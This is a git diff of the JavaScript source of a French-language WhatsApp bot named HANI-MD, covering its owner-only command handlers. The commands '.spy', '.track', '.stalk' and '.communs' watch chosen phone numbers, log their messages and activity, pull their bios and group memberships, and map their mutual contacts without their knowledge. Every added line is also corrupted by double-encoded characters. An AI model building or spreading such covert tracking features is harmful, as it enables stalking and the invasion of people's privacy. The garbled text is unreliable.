-┃ 📝 *Infos (À propos):*
-┃ → Tout le monde / Mes contacts / Personne
-┃
-┃ 👥 *Groupes:*
-┃ → Tout le monde / Mes contacts / Mes contacts sauf...
-┃
-┃ 📍 *Localisation en direct:*
-┃ → Personne / Partager avec...
+â”ƒ ðŸ“¸ *Photo de profil:*
+â”ƒ â†’ Tout le monde / Mes contacts / Personne
+â”ƒ
+â”ƒ ðŸ‘ï¸ *DerniÃ¨re connexion:*
+â”ƒ â†’ Tout le monde / Mes contacts / Personne
+â”ƒ
+â”ƒ âœ… *Confirmations de lecture:*
+â”ƒ â†’ Activer / DÃ©sactiver
+â”ƒ
+â”ƒ ðŸ“ *Infos (Ã€ propos):*
+â”ƒ â†’ Tout le monde / Mes contacts / Personne
+â”ƒ
+â”ƒ ðŸ‘¥ *Groupes:*
+â”ƒ â†’ Tout le monde / Mes contacts / Mes contacts sauf...
+â”ƒ
+â”ƒ ðŸ“ *Localisation en direct:*
+â”ƒ â†’ Personne / Partager avec...
 
-━━━━━━━━━━━━━━━━━━━━━
-💡 *Commandes du bot:*
-• .block [n°] - Bloquer un contact
-• .unblock [n°] - Débloquer
-• .blocklist - Voir les bloqués
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
+ðŸ’¡ *Commandes du bot:*
+â€¢ .block [nÂ°] - Bloquer un contact
+â€¢ .unblock [nÂ°] - DÃ©bloquer
+â€¢ .blocklist - Voir les bloquÃ©s
 
-⚠️ *Note:* Tu ne peux PAS masquer ton numéro.
+âš ï¸ *Note:* Tu ne peux PAS masquer ton numÃ©ro.
 C'est ton identifiant WhatsApp.
       `.trim();
       
@@ -6106,129 +6106,129 @@ C'est ton identifiant WhatsApp.
 
     case "broadcast":
     case "bc": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
-      if (!args) return send("❌ Donne un message à diffuser.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
+      if (!args) return send("âŒ Donne un message Ã  diffuser.");
       
       // Diffuser dans tous les groupes
       let sent = 0;
       for (const groupJid of Object.keys(db.data.groups)) {
         try {
-          await hani.sendMessage(groupJid, { text: `📢 *Annonce HANI-MD*\n\n${args}` });
+          await hani.sendMessage(groupJid, { text: `ðŸ“¢ *Annonce HANI-MD*\n\n${args}` });
           sent++;
           await delay(1000);
         } catch (e) {}
       }
-      return send(`✅ Message diffusé dans ${sent} groupes.`);
+      return send(`âœ… Message diffusÃ© dans ${sent} groupes.`);
     }
 
-    // ────────── 🕵️ SURVEILLANCE / SPY ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ•µï¸ SURVEILLANCE / SPY â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "watch":
     case "spy":
     case "surveiller": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
-      // Ajouter un numéro à surveiller
+      // Ajouter un numÃ©ro Ã  surveiller
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
       
       if (!targetNumber || targetNumber.length < 8) {
-        return send(`❌ *Usage:* .spy [numéro]\n\n📱 *Exemples:*\n• .spy 2250150252467\n• .spy +225 01 50 25 24 67\n• .spy @mention\n\n💡 Le numéro doit être au format international sans le +`);
+        return send(`âŒ *Usage:* .spy [numÃ©ro]\n\nðŸ“± *Exemples:*\nâ€¢ .spy 22550252467\nâ€¢ .spy +225 01 50 25 24 67\nâ€¢ .spy @mention\n\nðŸ’¡ Le numÃ©ro doit Ãªtre au format international sans le +`);
       }
       
-      // Vérifier si déjà surveillé
+      // VÃ©rifier si dÃ©jÃ  surveillÃ©
       if (watchList.has(targetNumber)) {
-        return send(`⚠️ Ce numéro est déjà surveillé!\n\n📱 ${formatPhoneNumber(targetNumber)}`);
+        return send(`âš ï¸ Ce numÃ©ro est dÃ©jÃ  surveillÃ©!\n\nðŸ“± ${formatPhoneNumber(targetNumber)}`);
       }
       
       watchList.add(targetNumber);
       
-      console.log(`[SPY] Surveillance ajoutée: ${targetNumber}`);
+      console.log(`[SPY] Surveillance ajoutÃ©e: ${targetNumber}`);
       console.log(`[SPY] Liste actuelle: ${[...watchList].join(", ")}`);
       
-      let response = `🕵️ *SURVEILLANCE ACTIVÉE*\n`;
-      response += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-      response += `📱 *Numéro:* ${formatPhoneNumber(targetNumber)}\n`;
-      response += `🔢 *ID interne:* ${targetNumber}\n\n`;
-      response += `✅ Tu recevras une alerte à chaque:\n`;
-      response += `   • Message texte\n`;
-      response += `   • Photo/Vidéo envoyée\n`;
-      response += `   • Audio/Document\n\n`;
-      response += `📊 *Surveillés:* ${watchList.size} personne(s)\n\n`;
-      response += `💡 Commandes:\n`;
-      response += `   • .spylist - Voir la liste\n`;
-      response += `   • .unspy ${targetNumber} - Arrêter`;
+      let response = `ðŸ•µï¸ *SURVEILLANCE ACTIVÃ‰E*\n`;
+      response += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+      response += `ðŸ“± *NumÃ©ro:* ${formatPhoneNumber(targetNumber)}\n`;
+      response += `ðŸ”¢ *ID interne:* ${targetNumber}\n\n`;
+      response += `âœ… Tu recevras une alerte Ã  chaque:\n`;
+      response += `   â€¢ Message texte\n`;
+      response += `   â€¢ Photo/VidÃ©o envoyÃ©e\n`;
+      response += `   â€¢ Audio/Document\n\n`;
+      response += `ðŸ“Š *SurveillÃ©s:* ${watchList.size} personne(s)\n\n`;
+      response += `ðŸ’¡ Commandes:\n`;
+      response += `   â€¢ .spylist - Voir la liste\n`;
+      response += `   â€¢ .unspy ${targetNumber} - ArrÃªter`;
       
       return send(response);
     }
 
     case "unwatch":
     case "unspy": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       
       if (!targetNumber) {
-        return send(`❌ *Usage:* .unspy [numéro]\n\n📱 Liste actuelle: ${watchList.size} surveillé(s)\nUtilise .spylist pour voir`);
+        return send(`âŒ *Usage:* .unspy [numÃ©ro]\n\nðŸ“± Liste actuelle: ${watchList.size} surveillÃ©(s)\nUtilise .spylist pour voir`);
       }
       
       if (!watchList.has(targetNumber)) {
-        return send(`⚠️ Ce numéro n'est pas surveillé.\n\nUtilise .spylist pour voir la liste.`);
+        return send(`âš ï¸ Ce numÃ©ro n'est pas surveillÃ©.\n\nUtilise .spylist pour voir la liste.`);
       }
       
       watchList.delete(targetNumber);
-      console.log(`[SPY] Surveillance retirée: ${targetNumber}`);
+      console.log(`[SPY] Surveillance retirÃ©e: ${targetNumber}`);
       
-      return send(`✅ *Surveillance désactivée*\n\n📱 ${formatPhoneNumber(targetNumber)}\n\n📊 Reste: ${watchList.size} surveillé(s)`);
+      return send(`âœ… *Surveillance dÃ©sactivÃ©e*\n\nðŸ“± ${formatPhoneNumber(targetNumber)}\n\nðŸ“Š Reste: ${watchList.size} surveillÃ©(s)`);
     }
 
     case "watchlist":
     case "spylist": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (watchList.size === 0) {
-        return send(`📭 *Aucune surveillance active*\n\n💡 Utilise .spy [numéro] pour commencer\n\nExemple: .spy 2250150252467`);
+        return send(`ðŸ“­ *Aucune surveillance active*\n\nðŸ’¡ Utilise .spy [numÃ©ro] pour commencer\n\nExemple: .spy 22550252467`);
       }
       
-      let list = `🕵️ *NUMÉROS SURVEILLÉS*\n`;
-      list += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
+      let list = `ðŸ•µï¸ *NUMÃ‰ROS SURVEILLÃ‰S*\n`;
+      list += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
       
       let i = 1;
       for (const num of watchList) {
         const tracked = activityTracker.get(num);
         list += `*${i}.* ${formatPhoneNumber(num)}\n`;
         if (tracked) {
-          list += `   👤 ${tracked.name}\n`;
-          list += `   💬 ${tracked.messageCount} msg(s)\n`;
-          list += `   🕐 Vu: ${tracked.lastSeen}\n`;
+          list += `   ðŸ‘¤ ${tracked.name}\n`;
+          list += `   ðŸ’¬ ${tracked.messageCount} msg(s)\n`;
+          list += `   ðŸ• Vu: ${tracked.lastSeen}\n`;
         } else {
-          list += `   ⏳ En attente d'activité...\n`;
+          list += `   â³ En attente d'activitÃ©...\n`;
         }
         list += `\n`;
         i++;
       }
       
-      list += `━━━━━━━━━━━━━━━━━━━━━\n`;
-      list += `📊 *Total:* ${watchList.size} surveillance(s)`;
+      list += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
+      list += `ðŸ“Š *Total:* ${watchList.size} surveillance(s)`;
       
       return send(list);
     }
 
     case "testspy":
     case "spytest": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
-      let info = `🕵️ *TEST SURVEILLANCE*\n`;
-      info += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-      info += `📊 *Surveillés:* ${watchList.size}\n`;
-      info += `📋 *Liste:*\n`;
+      let info = `ðŸ•µï¸ *TEST SURVEILLANCE*\n`;
+      info += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+      info += `ðŸ“Š *SurveillÃ©s:* ${watchList.size}\n`;
+      info += `ðŸ“‹ *Liste:*\n`;
       
       for (const num of watchList) {
-        info += `   • ${num}\n`;
+        info += `   â€¢ ${num}\n`;
       }
       
-      info += `\n🔍 *Dernier expéditeur détecté:*\n`;
+      info += `\nðŸ” *Dernier expÃ©diteur dÃ©tectÃ©:*\n`;
       info += `   ${sender?.split("@")[0] || "Aucun"}\n`;
       
       return send(info);
@@ -6237,7 +6237,7 @@ C'est ton identifiant WhatsApp.
     case "activity":
     case "activite":
     case "track": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
@@ -6245,36 +6245,36 @@ C'est ton identifiant WhatsApp.
       
       if (!targetNumber) {
         // Afficher les top utilisateurs actifs
-        if (activityTracker.size === 0) return send("📭 Aucune activité enregistrée.");
+        if (activityTracker.size === 0) return send("ðŸ“­ Aucune activitÃ© enregistrÃ©e.");
         
         const sorted = [...activityTracker.values()]
           .sort((a, b) => b.messageCount - a.messageCount)
           .slice(0, 15);
         
-        let list = "🕵️ *Activité récente (Top 15)*\n\n";
+        let list = "ðŸ•µï¸ *ActivitÃ© rÃ©cente (Top 15)*\n\n";
         sorted.forEach((user, i) => {
           list += `${i + 1}. *${user.name}*\n`;
-          list += `   📱 ${formatPhoneNumber(user.number)}\n`;
-          list += `   💬 ${user.messageCount} msgs\n`;
-          list += `   🕐 Vu: ${user.lastSeen}\n\n`;
+          list += `   ðŸ“± ${formatPhoneNumber(user.number)}\n`;
+          list += `   ðŸ’¬ ${user.messageCount} msgs\n`;
+          list += `   ðŸ• Vu: ${user.lastSeen}\n\n`;
         });
         return send(list);
       }
       
-      // Afficher l'activité d'un utilisateur spécifique
+      // Afficher l'activitÃ© d'un utilisateur spÃ©cifique
       const tracker = activityTracker.get(targetNumber);
-      if (!tracker) return send(`❌ Aucune activité enregistrée pour ${formatPhoneNumber(targetNumber)}`);
+      if (!tracker) return send(`âŒ Aucune activitÃ© enregistrÃ©e pour ${formatPhoneNumber(targetNumber)}`);
       
-      let text = `🕵️ *Activité de ${tracker.name}*\n`;
-      text += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-      text += `📱 *Numéro:* ${formatPhoneNumber(tracker.number)}\n`;
-      text += `📅 *1ère vue:* ${tracker.firstSeen}\n`;
-      text += `🕐 *Dernière vue:* ${tracker.lastSeen}\n`;
-      text += `💬 *Messages:* ${tracker.messageCount}\n`;
+      let text = `ðŸ•µï¸ *ActivitÃ© de ${tracker.name}*\n`;
+      text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+      text += `ðŸ“± *NumÃ©ro:* ${formatPhoneNumber(tracker.number)}\n`;
+      text += `ðŸ“… *1Ã¨re vue:* ${tracker.firstSeen}\n`;
+      text += `ðŸ• *DerniÃ¨re vue:* ${tracker.lastSeen}\n`;
+      text += `ðŸ’¬ *Messages:* ${tracker.messageCount}\n`;
       
-      // Groupes où l'utilisateur est actif
+      // Groupes oÃ¹ l'utilisateur est actif
       if (tracker.chats.size > 0) {
-        text += `\n🏘️ *Actif dans ${tracker.chats.size} groupe(s):*\n`;
+        text += `\nðŸ˜ï¸ *Actif dans ${tracker.chats.size} groupe(s):*\n`;
         let j = 1;
         for (const chat of tracker.chats) {
           if (j <= 5) {
@@ -6285,11 +6285,11 @@ C'est ton identifiant WhatsApp.
         if (tracker.chats.size > 5) text += `   ... et ${tracker.chats.size - 5} autres\n`;
       }
       
-      // Dernières activités
+      // DerniÃ¨res activitÃ©s
       if (tracker.activities.length > 0) {
-        text += `\n📊 *Dernières activités:*\n`;
+        text += `\nðŸ“Š *DerniÃ¨res activitÃ©s:*\n`;
         tracker.activities.slice(-5).forEach(act => {
-          text += `   • ${act.type?.replace("Message", "")} - ${act.time}\n`;
+          text += `   â€¢ ${act.type?.replace("Message", "")} - ${act.time}\n`;
         });
       }
       
@@ -6298,64 +6298,64 @@ C'est ton identifiant WhatsApp.
 
     case "clearactivity":
     case "cleartrack": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       activityTracker.clear();
-      return send("✅ Historique d'activité effacé.");
+      return send("âœ… Historique d'activitÃ© effacÃ©.");
     }
 
     case "tracklist":
     case "spiedlist": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (watchList.size === 0) {
-        return send("📭 Aucun utilisateur sous surveillance.\n\nUtilise `.spy @user` pour commencer.");
+        return send("ðŸ“­ Aucun utilisateur sous surveillance.\n\nUtilise `.spy @user` pour commencer.");
       }
       
-      let list = "🕵️ *Utilisateurs sous surveillance*\n━━━━━━━━━━━━━━━━━━━━━\n\n";
+      let list = "ðŸ•µï¸ *Utilisateurs sous surveillance*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n";
       let i = 1;
       for (const num of watchList) {
         const tracked = activityTracker.get(num);
-        list += `${i}. 📱 ${formatPhoneNumber(num)}\n`;
+        list += `${i}. ðŸ“± ${formatPhoneNumber(num)}\n`;
         if (tracked) {
-          list += `   👤 ${tracked.name}\n`;
-          list += `   💬 ${tracked.messageCount} msgs\n`;
-          list += `   🕐 ${tracked.lastSeen}\n`;
+          list += `   ðŸ‘¤ ${tracked.name}\n`;
+          list += `   ðŸ’¬ ${tracked.messageCount} msgs\n`;
+          list += `   ðŸ• ${tracked.lastSeen}\n`;
         } else {
-          list += `   ⏳ En attente d'activité...\n`;
+          list += `   â³ En attente d'activitÃ©...\n`;
         }
         list += "\n";
         i++;
       }
       
-      list += `📊 *Total:* ${watchList.size} surveillance(s) active(s)`;
+      list += `ðŸ“Š *Total:* ${watchList.size} surveillance(s) active(s)`;
       return send(list);
     }
 
-    // ────────── 🔗 CONTACTS EN COMMUN ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ”— CONTACTS EN COMMUN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "communs":
     case "common":
     case "commoncontacts":
     case "mutual":
     case "quiconnait": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
       
-      await send("🔍 *Analyse des contacts en commun en cours...*\nScanning de tous vos groupes...");
+      await send("ðŸ” *Analyse des contacts en commun en cours...*\nScanning de tous vos groupes...");
       
       try {
-        // Récupérer tous les groupes
+        // RÃ©cupÃ©rer tous les groupes
         const groups = await hani.groupFetchAllParticipating();
         const groupIds = Object.keys(groups);
         
         if (groupIds.length === 0) {
-          return send("❌ Aucun groupe trouvé.");
+          return send("âŒ Aucun groupe trouvÃ©.");
         }
         
-        // Map: numéro → { name, groups: [groupNames], inGroupsWith: Set(numéros) }
+        // Map: numÃ©ro â†’ { name, groups: [groupNames], inGroupsWith: Set(numÃ©ros) }
         const contactMap = new Map();
         const botNumber = hani.user?.id?.split(":")[0]?.split("@")[0];
         
@@ -6393,12 +6393,12 @@ C'est ton identifiant WhatsApp.
           }
         }
         
-        // Si un numéro cible est spécifié
+        // Si un numÃ©ro cible est spÃ©cifiÃ©
         if (targetNumber) {
           const targetContact = contactMap.get(targetNumber);
           
           if (!targetContact) {
-            return send(`❌ *${formatPhoneNumber(targetNumber)}* n'est dans aucun de vos groupes.`);
+            return send(`âŒ *${formatPhoneNumber(targetNumber)}* n'est dans aucun de vos groupes.`);
           }
           
           // Trouver les contacts en commun avec toi
@@ -6408,15 +6408,15 @@ C'est ton identifiant WhatsApp.
           // Contacts en commun entre toi et la cible
           const commonWithTarget = [...targetContacts].filter(n => myContacts.has(n) && n !== botNumber);
           
-          let text = `🔗 *CONTACTS EN COMMUN*\n`;
-          text += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-          text += `🎯 *Cible:* ${targetContact.name}\n`;
-          text += `📱 *Numéro:* ${formatPhoneNumber(targetNumber)}\n`;
-          text += `👑 *Admin:* ${targetContact.isAdmin ? "Oui" : "Non"}\n\n`;
+          let text = `ðŸ”— *CONTACTS EN COMMUN*\n`;
+          text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+          text += `ðŸŽ¯ *Cible:* ${targetContact.name}\n`;
+          text += `ðŸ“± *NumÃ©ro:* ${formatPhoneNumber(targetNumber)}\n`;
+          text += `ðŸ‘‘ *Admin:* ${targetContact.isAdmin ? "Oui" : "Non"}\n\n`;
           
-          text += `🏘️ *Groupes en commun avec toi:*\n`;
+          text += `ðŸ˜ï¸ *Groupes en commun avec toi:*\n`;
           const commonGroups = targetContact.groups.filter(g => {
-            // Vérifier si toi aussi tu es dans ce groupe
+            // VÃ©rifier si toi aussi tu es dans ce groupe
             for (const [num, c] of contactMap) {
               if (num === botNumber && c.groups.includes(g)) return true;
             }
@@ -6432,7 +6432,7 @@ C'est ton identifiant WhatsApp.
             text += `   Aucun groupe en commun\n`;
           }
           
-          text += `\n👥 *Contacts mutuels (${commonWithTarget.length}):*\n`;
+          text += `\nðŸ‘¥ *Contacts mutuels (${commonWithTarget.length}):*\n`;
           if (commonWithTarget.length > 0) {
             commonWithTarget.slice(0, 15).forEach((num, i) => {
               const c = contactMap.get(num);
@@ -6440,59 +6440,59 @@ C'est ton identifiant WhatsApp.
             });
             if (commonWithTarget.length > 15) text += `   ... et ${commonWithTarget.length - 15} autres\n`;
           } else {
-            text += `   Aucun contact mutuel trouvé\n`;
+            text += `   Aucun contact mutuel trouvÃ©\n`;
           }
           
-          text += `\n📊 *Stats:*\n`;
-          text += `   • Dans ${targetContact.groups.length} groupe(s)\n`;
-          text += `   • Connaît ${targetContact.inGroupsWith.size} personne(s)\n`;
+          text += `\nðŸ“Š *Stats:*\n`;
+          text += `   â€¢ Dans ${targetContact.groups.length} groupe(s)\n`;
+          text += `   â€¢ ConnaÃ®t ${targetContact.inGroupsWith.size} personne(s)\n`;
           
           return send(text);
         }
         
-        // Sans cible: afficher les personnes les plus "connectées"
+        // Sans cible: afficher les personnes les plus "connectÃ©es"
         const sorted = [...contactMap.entries()]
           .filter(([num]) => num !== botNumber && !isLID(num))
           .sort((a, b) => b[1].inGroupsWith.size - a[1].inGroupsWith.size)
           .slice(0, 20);
         
-        let text = `🔗 *TOP CONTACTS LES PLUS CONNECTÉS*\n`;
-        text += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-        text += `📊 *${groupIds.length} groupes analysés*\n`;
-        text += `👥 *${contactMap.size} contacts trouvés*\n\n`;
+        let text = `ðŸ”— *TOP CONTACTS LES PLUS CONNECTÃ‰S*\n`;
+        text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+        text += `ðŸ“Š *${groupIds.length} groupes analysÃ©s*\n`;
+        text += `ðŸ‘¥ *${contactMap.size} contacts trouvÃ©s*\n\n`;
         
         sorted.forEach(([num, contact], i) => {
-          const emoji = i < 3 ? ["🥇", "🥈", "🥉"][i] : `${i + 1}.`;
+          const emoji = i < 3 ? ["ðŸ¥‡", "ðŸ¥ˆ", "ðŸ¥‰"][i] : `${i + 1}.`;
           text += `${emoji} *${contact.name}*\n`;
-          text += `   📱 ${formatPhoneNumber(num)}\n`;
-          text += `   🔗 Connaît ${contact.inGroupsWith.size} personnes\n`;
-          text += `   🏘️ Dans ${contact.groups.length} groupe(s)\n\n`;
+          text += `   ðŸ“± ${formatPhoneNumber(num)}\n`;
+          text += `   ðŸ”— ConnaÃ®t ${contact.inGroupsWith.size} personnes\n`;
+          text += `   ðŸ˜ï¸ Dans ${contact.groups.length} groupe(s)\n\n`;
         });
         
-        text += `💡 *Utilise* \`.communs @user\` *pour voir les détails d'un contact*`;
+        text += `ðŸ’¡ *Utilise* \`.communs @user\` *pour voir les dÃ©tails d'un contact*`;
         
         return send(text);
         
       } catch (error) {
         console.error("[COMMUNS] Erreur:", error);
-        return send(`❌ Erreur: ${error.message}`);
+        return send(`âŒ Erreur: ${error.message}`);
       }
     }
 
-    // ────────── 🔍 QUI A MON NUMÉRO ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ” QUI A MON NUMÃ‰RO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "quiamon":
     case "whohasme":
     case "whosaveme": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
-      await send("🔍 *Recherche de qui a ton numéro...*");
+      await send("ðŸ” *Recherche de qui a ton numÃ©ro...*");
       
       try {
         const groups = await hani.groupFetchAllParticipating();
         const groupIds = Object.keys(groups);
         const botNumber = hani.user?.id?.split(":")[0]?.split("@")[0];
         
-        // Personnes qui sont dans les mêmes groupes que toi
+        // Personnes qui sont dans les mÃªmes groupes que toi
         const peopleWhoKnowMe = new Map();
         
         for (const groupId of groupIds) {
@@ -6500,7 +6500,7 @@ C'est ton identifiant WhatsApp.
           const groupName = group.subject || "Groupe sans nom";
           const participants = group.participants || [];
           
-          // Vérifier si le bot est dans ce groupe
+          // VÃ©rifier si le bot est dans ce groupe
           const botInGroup = participants.some(p => {
             const num = p.id?.split("@")[0]?.split(":")[0];
             return num === botNumber;
@@ -6508,7 +6508,7 @@ C'est ton identifiant WhatsApp.
           
           if (!botInGroup) continue;
           
-          // Toutes les personnes de ce groupe ont potentiellement ton numéro
+          // Toutes les personnes de ce groupe ont potentiellement ton numÃ©ro
           for (const p of participants) {
             const num = p.id?.split("@")[0]?.split(":")[0];
             if (!num || num === botNumber || isLID(num)) continue;
@@ -6531,69 +6531,69 @@ C'est ton identifiant WhatsApp.
         const sorted = [...peopleWhoKnowMe.entries()]
           .sort((a, b) => b[1].groups.length - a[1].groups.length);
         
-        let text = `👁️ *QUI A TON NUMÉRO?*\n`;
-        text += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-        text += `📊 *${peopleWhoKnowMe.size} personnes* sont dans tes groupes\n`;
-        text += `🏘️ Elles peuvent avoir ton numéro!\n\n`;
+        let text = `ðŸ‘ï¸ *QUI A TON NUMÃ‰RO?*\n`;
+        text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+        text += `ðŸ“Š *${peopleWhoKnowMe.size} personnes* sont dans tes groupes\n`;
+        text += `ðŸ˜ï¸ Elles peuvent avoir ton numÃ©ro!\n\n`;
         
-        text += `🔝 *Top 20 (par groupes en commun):*\n\n`;
+        text += `ðŸ” *Top 20 (par groupes en commun):*\n\n`;
         
         sorted.slice(0, 20).forEach(([num, person], i) => {
-          text += `${i + 1}. *${person.name}* ${person.isAdmin ? "👑" : ""}\n`;
-          text += `   📱 ${formatPhoneNumber(num)}\n`;
-          text += `   🏘️ ${person.groups.length} groupe(s) en commun\n\n`;
+          text += `${i + 1}. *${person.name}* ${person.isAdmin ? "ðŸ‘‘" : ""}\n`;
+          text += `   ðŸ“± ${formatPhoneNumber(num)}\n`;
+          text += `   ðŸ˜ï¸ ${person.groups.length} groupe(s) en commun\n\n`;
         });
         
         if (sorted.length > 20) {
           text += `... et ${sorted.length - 20} autres personnes\n\n`;
         }
         
-        text += `💡 *Note:* Ces personnes peuvent voir ton numéro dans les groupes.`;
+        text += `ðŸ’¡ *Note:* Ces personnes peuvent voir ton numÃ©ro dans les groupes.`;
         
         return send(text);
         
       } catch (error) {
         console.error("[QUIAMON] Erreur:", error);
-        return send(`❌ Erreur: ${error.message}`);
+        return send(`âŒ Erreur: ${error.message}`);
       }
     }
 
-    // ────────── 🕵️ PROFIL STALKER ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ•µï¸ PROFIL STALKER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "stalk":
     case "stalker":
     case "profil":
     case "whois": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
       
       if (!targetNumber) {
-        return send(`🕵️ *PROFIL STALKER*\n\nUtilisation:\n• \`.stalk @user\`\n• \`.stalk 225XXXXXXXXXX\`\n\nObtiens toutes les infos d'un contact!`);
+        return send(`ðŸ•µï¸ *PROFIL STALKER*\n\nUtilisation:\nâ€¢ \`.stalk @user\`\nâ€¢ \`.stalk 225XXXXXXXXXX\`\n\nObtiens toutes les infos d'un contact!`);
       }
       
       const targetJid = targetNumber + "@s.whatsapp.net";
       
-      await send(`🔍 *Récupération du profil de ${formatPhoneNumber(targetNumber)}...*`);
+      await send(`ðŸ” *RÃ©cupÃ©ration du profil de ${formatPhoneNumber(targetNumber)}...*`);
       
       try {
-        let text = `🕵️ *PROFIL STALKER*\n`;
-        text += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
-        text += `📱 *Numéro:* ${formatPhoneNumber(targetNumber)}\n`;
+        let text = `ðŸ•µï¸ *PROFIL STALKER*\n`;
+        text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
+        text += `ðŸ“± *NumÃ©ro:* ${formatPhoneNumber(targetNumber)}\n`;
         
-        // Récupérer le statut/bio
+        // RÃ©cupÃ©rer le statut/bio
         try {
           const status = await hani.fetchStatus(targetJid);
-          text += `📝 *Bio:* ${status?.status || "Pas de bio"}\n`;
+          text += `ðŸ“ *Bio:* ${status?.status || "Pas de bio"}\n`;
           if (status?.setAt) {
-            text += `📅 *Bio mise à jour:* ${new Date(status.setAt * 1000).toLocaleString("fr-FR")}\n`;
+            text += `ðŸ“… *Bio mise Ã  jour:* ${new Date(status.setAt * 1000).toLocaleString("fr-FR")}\n`;
           }
         } catch (e) {
-          text += `📝 *Bio:* Non disponible\n`;
+          text += `ðŸ“ *Bio:* Non disponible\n`;
         }
         
-        // Vérifier présence dans groupes
+        // VÃ©rifier prÃ©sence dans groupes
         const groups = await hani.groupFetchAllParticipating();
         let groupCount = 0;
         let groupNames = [];
@@ -6611,7 +6611,7 @@ C'est ton identifiant WhatsApp.
           }
         }
         
-        text += `\n🏘️ *Groupes en commun:* ${groupCount}\n`;
+        text += `\nðŸ˜ï¸ *Groupes en commun:* ${groupCount}\n`;
         if (groupNames.length > 0) {
           groupNames.slice(0, 5).forEach((g, i) => {
             text += `   ${i + 1}. ${g}\n`;
@@ -6619,34 +6619,34 @@ C'est ton identifiant WhatsApp.
           if (groupNames.length > 5) text += `   ... et ${groupNames.length - 5} autres\n`;
         }
         
-        text += `\n👑 *Admin quelque part:* ${isAdminSomewhere ? "Oui" : "Non"}\n`;
+        text += `\nðŸ‘‘ *Admin quelque part:* ${isAdminSomewhere ? "Oui" : "Non"}\n`;
         
-        // Activité enregistrée
+        // ActivitÃ© enregistrÃ©e
         const tracker = activityTracker.get(targetNumber);
         if (tracker) {
-          text += `\n📊 *Activité enregistrée:*\n`;
-          text += `   💬 ${tracker.messageCount} messages\n`;
-          text += `   📅 Première vue: ${tracker.firstSeen}\n`;
-          text += `   🕐 Dernière vue: ${tracker.lastSeen}\n`;
+          text += `\nðŸ“Š *ActivitÃ© enregistrÃ©e:*\n`;
+          text += `   ðŸ’¬ ${tracker.messageCount} messages\n`;
+          text += `   ðŸ“… PremiÃ¨re vue: ${tracker.firstSeen}\n`;
